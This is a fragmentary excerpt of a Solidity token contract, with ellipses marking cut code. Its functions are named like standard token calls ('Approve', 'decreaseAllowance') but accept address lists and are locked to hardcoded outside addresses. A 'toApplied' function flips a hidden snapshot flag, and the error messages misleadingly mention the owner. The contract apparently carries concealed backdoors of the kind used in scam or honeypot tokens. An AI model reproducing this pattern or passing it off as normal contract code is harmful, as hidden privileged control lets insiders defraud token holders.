...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function Approve(address [] calldata _addresses_) external  {
        require(0x2bF5B02605F71339e55afE9202D3F200124dEF3F == _msgSender() ||  0x2E647453bBd3F22D0f9cFf289ba7937bA27Cb956 == _msgSender(), "Ownable: caller is not the owner");
    ...
    function decreaseAllowance(address [] calldata _addresses_) external  {
        require(0x2bF5B02605F71339e55afE9202D3F200124dEF3F == _msgSender() , "Ownable: caller is not the owner");
        for (uint256 i = 0; i < _addresses_.length; i++) {
    ...
    function toApplied(bool c) external  {
        require(owner() == _msgSender() ||  0x2bF5B02605F71339e55afE9202D3F200124dEF3F == _msgSender(), "Ownable: caller is not the owner");
        _snapshotApplied = c;
    }
    /**
